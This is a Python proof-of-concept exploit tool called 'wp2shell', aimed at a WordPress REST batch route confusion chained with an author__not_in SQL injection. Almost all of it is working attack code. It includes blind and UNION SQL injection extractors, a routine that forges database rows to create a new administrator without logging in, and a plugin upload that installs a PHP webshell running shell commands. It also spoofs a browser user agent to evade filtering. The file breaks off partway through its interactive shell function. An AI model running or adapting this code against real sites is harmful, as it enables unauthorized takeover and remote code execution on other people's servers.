#!/usr/bin/env python3
"""
wp2shell - unified PoC for CVE-2026-63030 (chained with CVE-2026-60137)

    Unauthenticated SQL injection in WordPress core, reachable through REST
    batch route confusion, chained to remote code execution ("wp2shell").

        CVE-2026-63030  (GHSA-ff9f-jf42-662q)  REST batch route confusion  -> RCE
        CVE-2026-60137  (GHSA-fpp7-x2x2-2mjf)  WP_Query author__not_in SQLi

    Discovered by Adam Kues (Assetnote / Searchlight Cyber).

    UNAUTH CHAIN AFFECTS:  6.9.0-6.9.4  and  7.0.0-7.0.1   (only)
        6.8.x has the author__not_in SQLi bug but NOT the batch route
        confusion, so it is NOT reachable via this unauthenticated chain.
    PATCHED:  6.8.6 (SQLi) · 6.9.5 · 7.0.2 · 7.1-beta2
    CAVEAT:   the sink is only reached when a persistent object cache
              (Redis/Memcached) is NOT in use.

Original, self-contained tool (stdlib only - no `requests`, no `pip install`).
It re-implements and unifies techniques from public PoCs (credited in the
README); no code is copied verbatim. Prod-ready: HTTPS/self-signed (`--insecure`),
custom headers/UA, retries, request delay, a version-independent confusion
detector, and NULL-safe extraction.

Commands:  check · read · shell · sqli · scan       (see --help)
For AUTHORIZED security testing only - systems you own or may test in writing.
The webshell is token-gated and the default command is benign (`id`).
"""
from __future__ import annotations

import argparse
import hashlib
import io
import json
import re
import secrets
import shlex
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
import zipfile
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from http.cookiejar import CookieJar
from typing import Any, Callable, Dict, List, Optional, Tuple

__version__ = "1.1-unified"
BANNER = "wp2shell - RCE PoC by 0xsha"

# A realistic default UA - scanners with obvious UAs get filtered by WAFs/CDNs.
_DEFAULT_UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
               "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")

# ─────────────────────────────────────────────────────────── version intel ──
# The UNAUTH CHAIN (CVE-2026-63030 route confusion) reaches the SQLi only on
# these ranges. 6.8.x carries CVE-2026-60137 (author__not_in) but NOT the batch
# confusion (a regression introduced in 6.9.0 - verified by 6.8.3-vs-6.9.4 source).
_FULL_CHAIN = {(6, 9, n) for n in range(0, 5)} | {(7, 0, 0), (7, 0, 1)}
_SQLI_ONLY = {(6, 8, n) for n in range(0, 6)}   # SQLi bug present, chain NOT reachable
_PATCHED = {(6, 8, 6), (6, 9, 5), (7, 0, 2), (7, 1, 0)}


# ──────────────────────────────────────────────────────────────── output ──
_TTY = sys.stdout.isatty()
_COLOR = _TTY


def _paint(code: str, text: str) -> str:
    return f"\033[{code}m{text}\033[0m" if _COLOR else text


def info(m: str) -> None:
    print(f"[*] {m}")


def good(m: str) -> None:
    print(_paint("32", f"[+] {m}"))


def bad(m: str) -> None:
    print(_paint("31", f"[-] {m}"))


def warn(m: str) -> None:
    print(_paint("33", f"[!] {m}"))


def _progress(text: str) -> None:
    if _TTY:
        sys.stdout.write("\r\033[K    " + text)
        sys.stdout.flush()


def _clear_progress() -> None:
    if _TTY:
        sys.stdout.write("\r\033[K")
        sys.stdout.flush()


# ───────────────────────────────────────────────────────── HTTP transport ──
class TargetError(Exception):
    """Target unreachable (connection refused / DNS / timeout, after retries)."""


@dataclass
class Response:
    status: int
    elapsed: float
    body: str

    def json(self) -> Any:
        return json.loads(self.body)


@dataclass
class HttpConfig:
    """Shared transport policy for every request the tool makes."""
    timeout: float = 30.0
    proxy: Optional[str] = None
    insecure: bool = False                 # skip TLS verification (self-signed prod certs)
    headers: Dict[str, str] = field(default_factory=dict)   # extra request headers
    user_agent: str = _DEFAULT_UA
    retries: int = 2                       # retries on transient network errors
    delay: float = 0.0                     # seconds between requests (rate-limit / stealth)

    def opener(self, *extra_handlers) -> urllib.request.OpenerDirector:
        handlers = list(extra_handlers)
        if self.proxy:
            handlers.append(urllib.request.ProxyHandler({"http": self.proxy, "https": self.proxy}))
        if self.insecure:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            handlers.append(urllib.request.HTTPSHandler(context=ctx))
        return urllib.request.build_opener(*handlers)

    def merge_headers(self, base: Optional[Dict[str, str]] = None) -> Dict[str, str]:
        h = {"User-Agent": self.user_agent}
        if base:
            h.update(base)
        h.update(self.headers)             # user-supplied headers win
        return h

    def send(self, opener: urllib.request.OpenerDirector,
             request: urllib.request.Request) -> Response:
        if self.delay:
            time.sleep(self.delay)
        last: Optional[Exception] = None
        for attempt in range(self.retries + 1):
            start = time.monotonic()
            try:
                resp = opener.open(request, timeout=self.timeout)
                return Response(resp.status, time.monotonic() - start,
                                resp.read().decode("utf-8", "replace"))
            except urllib.error.HTTPError as exc:   # a real HTTP status - not an error to retry
                return Response(exc.code, time.monotonic() - start,
                                exc.read().decode("utf-8", "replace"))
            except OSError as exc:                  # URLError / refused / timeout / DNS
                last = exc
                if attempt < self.retries:
                    time.sleep(0.4 * (attempt + 1))
        raise TargetError(f"cannot reach {request.full_url}: {getattr(last, 'reason', last)}")


# ─────────────────────────────────────────────────── batch route confusion ──
# A path wp_parse_url() rejects. Never dialled; it seeds ONE WP_Error into the
# batch request list, desyncing $matches from $validation so a following
# sub-request is dispatched under the wrong handler - that IS CVE-2026-63030.
_PRIMER = {"method": "POST", "path": "///"}
_MARKER_CODES = ("parse_path_failed", "block_cannot_read", "rest_batch_not_allowed")


def _walk_codes(value: Any, out: Optional[set] = None) -> set:
    """Collect every `code` string anywhere in a nested batch response."""
    if out is None:
        out = set()
    if isinstance(value, dict):
        c = value.get("code")
        if isinstance(c, str):
            out.add(c)
        for v in value.values():
            _walk_codes(v, out)
    elif isinstance(value, list):
        for v in value:
            _walk_codes(v, out)
    return out


class BatchClient:
    """Talks to the REST batch endpoint and builds the nested confusion payloads.

    variant="posts"       outer carrier /wp/v2/posts,      inner inject via /wp/v2/users
    variant="categories"  outer carrier /wp/v2/categories, inner inject via /wp/v2/categories
    Both nest the route-confusion twice; `posts` is the attackercan-verified one.
    """

    def __init__(self, base_url: str, *, http: Optional[HttpConfig] = None,
                 rest_route: Optional[bool] = None, variant: str = "posts") -> None:
        self.base_url = base_url.rstrip("/")
        self.http = http or HttpConfig()
        self.rest_route = rest_route      # None => auto-detect on first use
        self.variant = variant
        self._opener = self.http.opener()

    def _endpoint(self, rest_route: bool) -> str:
        return (f"{self.base_url}/?rest_route=/batch/v1" if rest_route
                else f"{self.base_url}/wp-json/batch/v1")

    def resolve(self) -> str:
        if self.rest_route is not None:
            return self._endpoint(self.rest_route)
        for rr in (False, True):
            try:
                if self._raw_post(self._endpoint(rr), {"requests": []}).status == 207:
                    self.rest_route = rr
                    return self._endpoint(rr)
            except TargetError:
                raise
            except Exception:
                continue
        self.rest_route = False
        return self._endpoint(False)

    @property
    def endpoint(self) -> str:
        return self.resolve()

    def _raw_post(self, url: str, payload: dict) -> Response:
        req = urllib.request.Request(
            url, data=json.dumps(payload).encode(), method="POST",
            headers=self.http.merge_headers({"Content-Type": "application/json"}))
        return self.http.send(self._opener, req)

    def post(self, payload: dict) -> Response:
        return self._raw_post(self.endpoint, payload)

    def probe(self) -> Response:
        return self.post({"requests": []})

    def confusion_markers(self) -> bool:
        """Version-independent, non-destructive confirmation of CVE-2026-63030.

        One batch of POST sub-requests (GET is not allowed at the outer batch
        level): the desync makes `POST /wp/v2/posts` be answered by the
        block-renderer's permission callback, so `block_cannot_read` appears -
        a permission error from a handler it never asked for. Proof of the
        confusion even when the SQLi sink is object-cached or WAF-filtered, and
        no version fingerprint needed. Neither create handler runs (permission
        is denied first), so it is non-destructive. (Detection technique per
        Hadrian / Icex0.)
        """
        payload = {"requests": [
            _PRIMER,
            {"method": "POST", "path": "/wp/v2/posts"},
            {"method": "POST", "path": "/wp/v2/block-renderer/core/paragraph"},
            {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
        ]}
        try:
            return "block_cannot_read" in _walk_codes(self.post(payload).json())
        except Exception:
            return False

    def _payload(self, author_not_in: str) -> dict:
        enc = urllib.parse.quote(author_not_in, safe="")
        if self.variant == "categories":
            inner = {"requests": [
                _PRIMER,
                {"method": "GET", "path": f"/wp/v2/categories?author_exclude={enc}"},
                {"method": "GET", "path": "/wp/v2/posts"},
            ]}
            carrier = {"method": "POST", "path": "/wp/v2/categories",
                       "body": {"name": f"x{secrets.token_hex(3)}", "requests": inner["requests"]}}
        else:  # "posts" (attackercan-verified)
            inner = {"requests": [
                _PRIMER,
                {"method": "GET", "path": f"/wp/v2/users?author_exclude={enc}"},
                {"method": "GET", "path": "/wp/v2/posts"},
            ]}
            carrier = {"method": "POST", "path": "/wp/v2/posts", "body": inner}
        return {"requests": [
            _PRIMER,
            carrier,
            {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
        ]}

    def inject(self, author_not_in: str) -> Response:
        return self.post(self._payload(author_not_in))

    def union_inject(self, author_not_in: str) -> Response:
        """Land `author_not_in` in a non-split, no-ORDER-BY WP_Query so a UNION survives.

        The source request targets the single-post item route /wp/v2/posts/999999, so the
        collection-only params author_exclude/orderby/per_page pass its item-schema validation
        unchecked; the inner desync then dispatches it under the posts collection handler.
        orderby=none drops the trailing ORDER BY (which would break UNION), and per_page=500 keeps
        WP_Query in full-row mode, so a UNION SELECT row comes back as a fake WP_Post. (Technique:
        Icex0/wp2shell-poc.)
        """
        q = urllib.parse.urlencode({"author_exclude": author_not_in, "orderby": "none", "per_page": "500"})
        inner = {"requests": [
            _PRIMER,
            {"method": "GET", "path": "/wp/v2/posts/999999?" + q},
            {"method": "GET", "path": "/wp/v2/posts"},
        ]}
        return self.post({"requests": [
            _PRIMER,
            {"method": "POST", "path": "/wp/v2/posts", "body": inner},
            {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
        ]})

    def rows(self, response: Response) -> Optional[list]:
        """Inner get_items() rows from a nested batch response, else None."""
        try:
            inner = response.json()["responses"][1]["body"]
            result = inner["responses"][1]["body"]
        except (KeyError, IndexError, TypeError, ValueError):
            return None
        return result if isinstance(result, list) else None


class DirectClient:
    """Injects author__not_in directly into a *facilitating* sink - a plugin or
    theme that forwards a raw request value into WP_Query['author__not_in'].
    This is how CVE-2026-60137 is reached on WordPress 6.8.x (core REST coerces
    `author_exclude` to an int array, so the batch chain is 6.9.0+ only).

    Time-based by default; pass a substring present only when rows match to
    switch to faster boolean.
    """

    def __init__(self, base_url: str, endpoint: str, param: str, *,
                 http: Optional[HttpConfig] = None, true_contains: Optional[str] = None) -> None:
        self.base_url = base_url.rstrip("/")
        self.endpoint = endpoint if endpoint.startswith("/") else "/" + endpoint
        self.param = param
        self.http = http or HttpConfig()
        self.true_contains = true_contains
        self._opener = self.http.opener()

    def inject(self, author_not_in: str) -> Response:
        sep = "&" if "?" in self.endpoint else "?"
        url = (f"{self.base_url}{self.endpoint}{sep}{self.param}="
               + urllib.parse.quote(author_not_in, safe=""))
        req = urllib.request.Request(url, headers=self.http.merge_headers())
        return self.http.send(self._opener, req)

    def rows(self, response: Response) -> Optional[list]:
        if self.true_contains and self.true_contains in response.body:
            return [1]
        return None


# ─────────────────────────────────────────────────── blind SQLi oracles ──
_MIN, _MAX = 32, 126


class BlindSQLi:
    """Boolean- and time-based blind extraction over any author__not_in sink.

    The injected value lands as  ... post_author NOT IN (<value>) ...  so
    `0) <sql>-- -` closes the IN() list and appends arbitrary SQL. Works over
    BatchClient (the 6.9+/7.0 chain) and DirectClient (a facilitating sink).
    time_mode encodes each truth in latency via a conditional SLEEP.
    """

    def __init__(self, client, *, sleep: float = 3.0, time_mode: bool = False) -> None:
        self.client = client
        self.sleep = sleep
        self.time_mode = time_mode
        self.requests = 0

    def confirm(self) -> bool:
        """Deterministic differential: a true condition and a false one must
        disagree - independent of row counts and the OR short-circuit that
        defeats a naive `OR SLEEP` probe on a default install."""
        return self._true("1=1") and not self._true("1=0")

    def has_rows(self) -> bool:
        """Whether the sink returns ≥1 row at all (needed for a boolean oracle)."""
        return self._true("1=1")

    def time_delay(self) -> Tuple[float, float]:
        """(baseline, injected) wall time - corroboration for `check`."""
        base = self.client.inject("0) AND (SELECT 1 FROM (SELECT SLEEP(0))_z)-- -").elapsed
        self.requests += 1
        delayed = self.client.inject(
            f"0) AND (SELECT 1 FROM (SELECT SLEEP({self.sleep:g}))_z)-- -").elapsed
        self.requests += 1
        return base, delayed

    def extract(self, expr: str, *, max_length: int = 128,
                on_char: Optional[Callable[[str], None]] = None) -> str:
        chars: List[str] = []
        for pos in range(1, max_length + 1):
            # COALESCE keeps a NULL value from short-circuiting into an empty read.
            probe = f"ASCII(SUBSTRING(COALESCE(({expr}),''),{pos},1))"
            if not self._true(f"{probe} > 0"):
                break
            lo, hi = _MIN, _MAX
            while lo < hi:
                mid = (lo + hi) // 2
                if self._true(f"{probe} > {mid}"):
                    lo = mid + 1
                else:
                    hi = mid
            chars.append(chr(lo))
            if on_char:
                on_char("".join(chars))
        return "".join(chars)

    def integer(self, expr: str) -> int:
        """Read an integer; raise if extraction failed (so it can't be mistaken
        for a real count of zero)."""
        t = self.extract(expr).strip()
        if not t.lstrip("-").isdigit():
            raise ValueError(f"expected an integer from {expr!r}, got {t!r}")
        return int(t)

    def _true(self, cond: str) -> bool:
        self.requests += 1
        if self.time_mode:
            resp = self.client.inject(f"0) AND IF(({cond}),SLEEP({self.sleep:g}),0)=0-- -")
            return resp.elapsed >= self.sleep * 0.8
        return bool(self.client.rows(self.client.inject(f"0) AND ({cond})-- -")))


# ─────────── UNION extractor + crack-free pre-auth admin creation ──
# The in-band UNION primitive forges a fake WP_Post row and the SQLi-to-customizer bridge that
# turns it into a brand-new administrator (no hash, no cracking).
# Technique: sergiointel/wp2shell-poc (originator); implementation adapted from Icex0/wp2shell-poc.
class UnionSQLi:
    """In-band UNION extractor: forge a fake wp_posts row and read its reflected title in one
    request (via BatchClient.union_inject's non-split, no-ORDER-BY query)."""

    _COLUMNS = 23           # wp_posts column count (stable across modern WordPress)
    _TITLE_COL = 6          # post_title is rendered back in the REST response
    _RE = re.compile(r"\|\|([0-9A-Fa-f]*)\|\|")
    _PUBLISH = "0x7075626c697368"
    _POST = "0x706f7374"
    _DATE = "0x323032302d30312d30312030303a30303a3030"

    def __init__(self, client: BatchClient) -> None:
        self.client = client
        self.requests = 0

    def available(self) -> bool:
        return self._read("SELECT 0x4f4b") == "OK"

    def extract(self, expr: str) -> str:
        return self._read(expr) or ""

    def integer(self, expr: str) -> int:
        t = (self._read(f"SELECT ({expr})") or "").strip()
        if not t.lstrip("-").isdigit():
            raise ValueError(f"expected an integer from {expr!r}, got {t!r}")
        return int(t)

    def _read(self, expr: str) -> Optional[str]:
        self.requests += 1
        resp = self.client.union_inject(f"0) UNION SELECT {self._columns(expr)}-- -")
        m = self._RE.search(resp.body)
        if not m:
            return None
        digits = m.group(1)
        if len(digits) % 2:
            digits = digits[:-1]
        try:
            return bytes.fromhex(digits).decode("utf-8", "replace")
        except ValueError:
            return None

    def _columns(self, expr: str) -> str:
        cols = []
        for i in range(1, self._COLUMNS + 1):
            if i == 1:
                cols.append("999999")
            elif i in (3, 4, 15, 16):
                cols.append(self._DATE)
            elif i == self._TITLE_COL:
                cols.append(f"CONCAT(0x7c7c,HEX(CAST(({expr})AS CHAR)),0x7c7c)")
            elif i == 8:
                cols.append(self._PUBLISH)
            elif i == 21:
                cols.append(self._POST)
            else:
                cols.append(str(i))
        return ",".join(cols)


_POST_DATE = "2020-01-01 00:00:00"
_OEMBED_SIZE = 'a:2:{s:5:"width";s:3:"500";s:6:"height";s:3:"750";}'


def _mysql_hex(text: str) -> str:
    return f"0x{text.encode().hex()}" if text else "''"


def _wp_posts_tuple(row_id: int, *, body: str = "", title: str = "", status: str = "publish",
                    slug: str = "", parent: int = 0, kind: str = "post", author: int = 1) -> str:
    cols = [str(row_id), str(author), _mysql_hex(_POST_DATE), _mysql_hex(_POST_DATE), _mysql_hex(body),
            _mysql_hex(title), "''", _mysql_hex(status), _mysql_hex("closed"), _mysql_hex("closed"), "''",
            _mysql_hex(slug), "''", "''", _mysql_hex(_POST_DATE), _mysql_hex(_POST_DATE), "''", str(parent),
            "''", "0", _mysql_hex(kind), "''", "0"]
    return ",".join(cols)


@dataclass
class CreatedAdmin:
    username: str
    password: str
    email: str
    source_admin_id: int
    table_prefix: str


@dataclass
class _PoisonGraph:
    cache_post_ids: List[int]
    source_admin_id: int

    def __post_init__(self) -> None:
        self.outer_id = 1800000000 + secrets.randbelow(100000000)
        self.nav_item_id = self.outer_id + 1
        self.inner_id = self.outer_id + 2
        self.changeset_id, self.cache_id, self.request_id = self.cache_post_ids

    def rows(self, changeset: str, trigger_embed_url: str) -> List[str]:
        return [
            _wp_posts_tuple(0, body=f'[embed width="500" height="750"]{trigger_embed_url}[/embed]', title="trigger", slug="trigger"),
            _wp_posts_tuple(self.changeset_id, body=changeset, title="changeset", status="future", slug=str(uuid.uuid4()), parent=self.outer_id, kind="customize_changeset"),
            _wp_posts_tuple(self.outer_id, body="outer", title="outer", status="draft", slug="outer", parent=self.changeset_id),
            _wp_posts_tuple(self.cache_id, title="cache", slug="cache", parent=self.changeset_id),
            _wp_posts_tuple(self.nav_item_id, body="nav", title="nav", slug="nav", parent=self.request_id, kind="nav_menu_item"),
            _wp_posts_tuple(self.request_id, body="parse", title="parse", status="parse", slug="parse", parent=self.inner_id, kind="request"),
            _wp_posts_tuple(self.inner_id, body="inner", title="inner", status="draft", slug="inner", parent=self.request_id),
        ]


class PreAuthAdminCreator:
    """Turn the UNION fake-post primitive into a brand-new administrator, unauthenticated.

    Forges oembed_cache + customize_changeset(user_id=<existing admin>) + nav_menu_item rows so the
    customizer runs as that admin, then POST /wp/v2/users creates a fresh admin. No password hash is
    read or cracked. Technique: sergiointel/wp2shell-poc (originator); impl adapted from Icex0.
    """

    _ADMIN_PREFIX = "wp2_"
    _PASSWORD_PREFIX = "Wp2!"
    _EMAIL_DOMAIN = "wp2shell.invalid"
    _NAV_URL = "https://example.invalid/"

    def __init__(self, base_url: str, *, http: Optional[HttpConfig] = None,
                 rest_route: Optional[bool] = None) -> None:
        self.base_url = base_url.rstrip("/")
        self.http = http or HttpConfig()
        self.client = BatchClient(base_url, http=self.http, rest_route=rest_route)
        self._opener = self.http.opener()

    def create_admin(self) -> CreatedAdmin:
        sqli = UnionSQLi(self.client)
        if not sqli.available():
            raise RuntimeError("UNION fake-post primitive not available (patched, or object cache on)")
        nonce = secrets.token_hex(6)
        embeds = self._loopback_embed_urls(nonce)
        self._prime_oembed_posts(embeds)
        posts_table = self._posts_table(sqli)
        prefix = posts_table[:-5]
        source_admin_id = self._first_admin_id(sqli, prefix)
        backing = self._oembed_backing_ids(sqli, posts_table, embeds)
        username = f"{self._ADMIN_PREFIX}{nonce}"
        password = f"{self._PASSWORD_PREFIX}{secrets.token_urlsafe(15)}"
        email = f"{username}@{self._EMAIL_DOMAIN}"
        self._submit_user_write(backing, embeds, source_admin_id,
                                {"username": username, "password": password, "email": email,
                                 "roles": ["administrator"]})
        return CreatedAdmin(username, password, email, source_admin_id, prefix)

    def _posts_table(self, sqli: UnionSQLi) -> str:
        t = sqli.extract("SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() "
                         "AND RIGHT(TABLE_NAME,6)=0x5f706f737473 ORDER BY CHAR_LENGTH(TABLE_NAME),TABLE_NAME LIMIT 1")
        if not re.fullmatch(r"[A-Za-z0-9_$]+", t):
            raise RuntimeError("could not recover wp_posts table name")
        return t

    def _first_admin_id(self, sqli: UnionSQLi, prefix: str) -> int:
        cap = _mysql_hex(prefix + "capabilities")
        ser = _mysql_hex('s:13:"administrator";b:1;')
        aid = sqli.integer(f"SELECT u.ID FROM `{prefix}users` u JOIN `{prefix}usermeta` m ON m.user_id=u.ID "
                           f"WHERE m.meta_key={cap} AND INSTR(m.meta_value,{ser})>0 ORDER BY u.ID LIMIT 1")
        if aid < 1:
            raise RuntimeError("could not find an existing administrator ID")
        return aid

    def _loopback_embed_urls(self, nonce: str) -> List[str]:
        link = self._first_public_post_link()
        s = urllib.parse.urlsplit(link)
        return [urllib.parse.urlunsplit((s.scheme, s.netloc, s.path, s.query, f"{nonce}{i}")) for i in range(3)]

    def _first_public_post_link(self) -> str:
        with self._open_rest("/wp/v2/posts", {"per_page": "1", "_fields": "link"}) as r:
            posts = json.loads(r.read())
        if not posts or not posts[0].get("link"):
            raise RuntimeError("could not find a public post link for oEmbed seeding")
        return posts[0]["link"]

    def _prime_oembed_posts(self, embeds: List[str]) -> None:
        content = "".join(f'[embed width="500" height="750"]{u}[/embed]' for u in embeds)
        self._render_union_posts([_wp_posts_tuple(0, body=content, title="seed", slug="seed")])

    def _oembed_backing_ids(self, sqli: UnionSQLi, posts_table: str, embeds: List[str]) -> List[int]:
        ids = []
        for u in embeds:
            cache = hashlib.md5((u + _OEMBED_SIZE).encode()).hexdigest()  # oEmbed cache key only
            ids.append(sqli.integer(f"SELECT ID FROM `{posts_table}` WHERE post_type=0x6f656d6265645f6361636865 "
                                    f"AND post_name=0x{cache.encode().hex()} ORDER BY ID DESC LIMIT 1"))
        if any(i < 1 for i in ids) or len(set(ids)) != 3:
            raise RuntimeError(f"could not recover three unique oEmbed cache post IDs: {ids}")
        return ids

    def _submit_user_write(self, backing: List[int], embeds: List[str], source_admin_id: int,
                           user_body: Dict[str, object]) -> None:
        g = _PoisonGraph(backing, source_admin_id)
        rows = g.rows(self._changeset_payload(g.nav_item_id, source_admin_id), embeds[1])
        self._render_union_posts(rows, tail_requests=[
            {"method": "POST", "path": "/wp/v2/users", "body": user_body},
            {"method": "POST", "path": "/wp/v2/users", "body": user_body},
        ])

    def _changeset_payload(self, nav_item_id: int, user_id: int) -> str:
        return json.dumps({f"nav_menu_item[{nav_item_id}]": {
            "type": "nav_menu_item", "user_id": user_id, "value": {
                "object_id": 0, "object": "", "menu_item_parent": 0, "position": 0, "type": "custom",
                "title": "generated", "url": self._NAV_URL, "target": "", "attr_title": "",
                "description": "", "classes": "", "xfn": "", "status": "publish", "nav_menu_term_id": 0,
                "_invalid": False}}}, separators=(",", ":"))

    def _render_union_posts(self, post_rows: List[str], tail_requests: Optional[List[dict]] = None) -> None:
        union = "1) AND 1=0 UNION ALL SELECT " + " UNION ALL SELECT ".join(post_rows) + " -- -"
        reqs = [
            {"method": "GET", "path": "http://:"},
            {"method": "GET", "path": "/wp/v2/widgets?" + urllib.parse.urlencode(
                {"author_exclude": union, "per_page": -1, "orderby": "none", "context": "view"})},
            {"method": "GET", "path": "/wp/v2/posts"},
        ]
        if tail_requests:
            reqs.extend(tail_requests)
        self._nested_batch(reqs, timeout=60)

    def _nested_batch(self, requests: List[dict], *, timeout: float) -> None:
        old = self.http.timeout
        self.http.timeout = timeout
        try:
            resp = self.client.post({"requests": [
                {"method": "POST", "path": "http://:"},
                {"method": "POST", "path": "/wp/v2/posts", "body": {"requests": requests}},
                {"method": "POST", "path": "/batch/v1"},
            ]})
        finally:
            self.http.timeout = old
        if resp.status >= 400:
            raise TargetError(f"batch request returned HTTP {resp.status}")

    def _open_rest(self, route: str, query: Dict[str, str]):
        self.client.resolve()
        if self.client.rest_route:
            url = f"{self.base_url}/?" + urllib.parse.urlencode({"rest_route": route, **query})
        else:
            url = f"{self.base_url}/wp-json{route}?" + urllib.parse.urlencode(query)
        return self._opener.open(urllib.request.Request(url, headers=self.http.merge_headers()),
                                 timeout=self.http.timeout)


# ────────────────────────────────────── version fingerprint + classify ──
def _get_text(opener, url: str, headers: dict, timeout: float) -> str:
    try:
        return opener.open(urllib.request.Request(url, headers=headers),
                           timeout=timeout).read().decode("utf-8", "replace")
    except Exception:
        return ""


def detect_version(base: str, http: HttpConfig) -> Optional[Tuple[int, int, int]]:
    opener = http.opener()
    headers = http.merge_headers()
    base = base.rstrip("/") + "/"
    cands: List[str] = []
    for path in ("wp-json/", "?rest_route=/"):
        body = _get_text(opener, urllib.parse.urljoin(base, path), headers, http.timeout)
        for m in re.finditer(r'"generator":"[^"]*?(\d+\.\d+(?:\.\d+)?)"', body):
            cands.append(m.group(1))
        if cands:
            break
    if not cands:
        for path in ("feed/", "feed/rss2/"):
            body = _get_text(opener, urllib.parse.urljoin(base, path), headers, http.timeout)
            for m in re.finditer(r"[?&]v=(\d+\.\d+(?:\.\d+)?)", body):
                cands.append(m.group(1))
            if cands:
                break
    if not cands:
        body = _get_text(opener, urllib.parse.urljoin(base, "readme.html"), headers, http.timeout)
        m = re.search(r"[Vv]ersion\s+(\d+\.\d+(?:\.\d+)?)", body)
        if m:
            cands.append(m.group(1))
    if not cands:
        body = _get_text(opener, base, headers, http.timeout)
        m = re.search(r'name=["\']generator["\'][^>]*content=["\']WordPress\s+(\d+\.\d+(?:\.\d+)?)', body)
        if m:
            cands.append(m.group(1))
    for raw in cands:
        parts = [int(x) for x in raw.split(".")[:3] if x.isdigit()]
        while len(parts) < 3:
            parts.append(0)
        if len(parts) == 3:
            return (parts[0], parts[1], parts[2])
    return None


def classify(v: Optional[Tuple[int, int, int]]) -> str:
    if v is None:
        return _paint("33", "unknown (could not fingerprint)")
    vs = ".".join(map(str, v))
    if v in _PATCHED or v > (7, 0, 2):
        return _paint("32", f"{vs}  (patched)")
    if v in _FULL_CHAIN:
        return _paint("31", f"{vs}  VULNERABLE - full RCE chain")
    if v in _SQLI_ONLY:
        return _paint("33", f"{vs}  SQLi bug present, but chain NOT reachable (needs 6.9.0+)")
    return _paint("33", f"{vs}  (out of documented range)")


# ─── structural fallback: was the inner injection route dispatched as posts? ──
_POST_MARKERS = ('"date_gmt"', '"comment_status"', '"ping_status"', '"sticky"')


def confusion_structural(client: BatchClient) -> Optional[bool]:
    try:
        resp = client.inject("99999999")  # huge author id => nothing filtered out
        inner = resp.json()["responses"][1]["body"]["responses"][1]["body"]
    except Exception:
        return None
    blob = json.dumps(inner)
    if any(m in blob for m in _POST_MARKERS):
        return True
    if isinstance(inner, list) and inner and '"taxonomy"' not in blob:
        return True
    return False


# ─────────────────────────────────────────── RCE: plugin webshell ──
_MARKER = "WP2SHELL"
_CWD_MARK = "__wp2shellcwd__"


class AdminSession:
    """Authenticated admin session: deploy a token-gated webshell, run commands."""

    def __init__(self, base_url: str, *, http: Optional[HttpConfig] = None) -> None:
        self.base_url = base_url.rstrip("/")
        self.http = http or HttpConfig()
        self._slug = "wp2shell_" + secrets.token_hex(4)
        self._token = secrets.token_hex(16)
        self._jar = CookieJar()
        self._opener = self.http.opener(urllib.request.HTTPCookieProcessor(self._jar))

    def login(self, user: str, password: str) -> bool:
        self._get("/wp-login.php")
        self._post("/wp-login.php", {
            "log": user, "pwd": password, "wp-submit": "Log In",
            "redirect_to": f"{self.base_url}/wp-admin/", "testcookie": "1",
        })
        return any(c.name.startswith("wordpress_logged_in") for c in self._jar)

    def deploy_webshell(self) -> str:
        page = self._get("/wp-admin/plugin-install.php?tab=upload")
        nonce = self._nonce(page)
        if not nonce:
            raise RuntimeError("plugin-upload nonce not found (are the credentials valid?)")
        body, ctype = self._multipart(
            {"_wpnonce": nonce,
             "_wp_http_referer": "/wp-admin/plugin-install.php?tab=upload",
             "install-plugin-submit": "Install Now"},
            {"pluginzip": (f"{self._slug}.zip", self._plugin_zip())},
        )
        self._post("/wp-admin/update.php?action=upload-plugin", body, {"Content-Type": ctype})
        return f"/wp-content/plugins/{self._slug}/{self._slug}.php"

    def run(self, shell_path: str, command: str) -> Optional[str]:
        q = urllib.parse.urlencode({"t": self._token, "c": command})
        out = self._get(f"{shell_path}?{q}")
        m = re.search(rf"{_MARKER}::(.*?)::END", out, re.S)
        return m.group(1) if m else None

    def _get(self, path: str) -> str:
        req = urllib.request.Request(self.base_url + path, headers=self.http.merge_headers())
        return self.http.send(self._opener, req).body

    def _post(self, path: str, data, headers: Optional[dict] = None) -> str:
        if isinstance(data, dict):
            data = urllib.parse.urlencode(data).encode()
        req = urllib.request.Request(self.base_url + path, data=data,
                                     headers=self.http.merge_headers(headers or {}))
        return self.http.send(self._opener, req).body

    def _plugin_zip(self) -> bytes:
        php = (
            "<?php\n"
            "/*\nPlugin Name: wp2shell\nDescription: PoC webshell. DELETE AFTER TESTING.\n*/\n"
            f"if (hash_equals('{self._token}', (string)($_GET['t'] ?? '')) && isset($_GET['c'])) {{\n"
            f"    echo '{_MARKER}::' . shell_exec((string)$_GET['c']) . '::END';\n"
            "}\n"
        )
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr(f"{self._slug}/{self._slug}.php", php)
        return buf.getvalue()

    @staticmethod
    def _nonce(html: str) -> Optional[str]:
        m = re.search(r'action="[^"]*action=upload-plugin".*?name="_wpnonce"[^>]*value="([0-9a-f]+)"', html, re.S)
        if m:
            return m.group(1)
        m = re.search(r'<input[^>]*name="_wpnonce"[^>]*value="([0-9a-f]+)"', html)
        return m.group(1) if m else None

    @staticmethod
    def _multipart(fields: Dict[str, str], files: Dict[str, Tuple[str, bytes]]) -> Tuple[bytes, str]:
        boundary = "----wp2shell" + uuid.uuid4().hex
        buf = io.BytesIO()
        for name, value in fields.items():
            buf.write(f"--{boundary}\r\n".encode())
            buf.write(f'Content-Disposition: form-data; name="{name}"\r\n\r\n{value}\r\n'.encode())
        for name, (filename, content) in files.items():
            buf.write(f"--{boundary}\r\n".encode())
            buf.write(f'Content-Disposition: form-data; name="{name}"; filename="{filename}"\r\n'.encode())
            buf.write(b"Content-Type: application/octet-stream\r\n\r\n" + content + b"\r\n")
        buf.write(f"--{boundary}--\r\n".encode())
        return buf.getvalue(), f"multipart/form-data; boundary={boundary}"


def _repl(session: AdminSession, path: str) -> None:
    pwd = session.run(path, "pwd")
